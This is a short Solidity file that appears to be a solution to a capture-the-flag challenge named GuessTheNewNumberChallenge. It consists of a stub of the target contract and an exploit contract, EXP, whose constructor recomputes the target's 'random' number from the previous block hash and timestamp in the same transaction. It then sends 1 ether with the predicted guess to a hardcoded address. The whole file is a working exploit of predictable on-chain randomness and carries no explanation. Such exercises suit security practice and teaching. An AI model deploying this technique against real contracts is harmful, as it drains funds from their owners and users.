pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {}

    function isComplete() public view returns (bool) {}

    function guess(uint8 n) public payable {}

}
contract EXP {
    constructor() public payable {
        uint8 result = uint8(keccak256(block.blockhash(block.number - 1), now));

        GuessTheNewNumberChallenge target = GuessTheNewNumberChallenge(0xE8BE7654f6C8C23026939901b80530dCf0AfCA75);
        target.guess.value(1 ether)(result);
    }

    
}
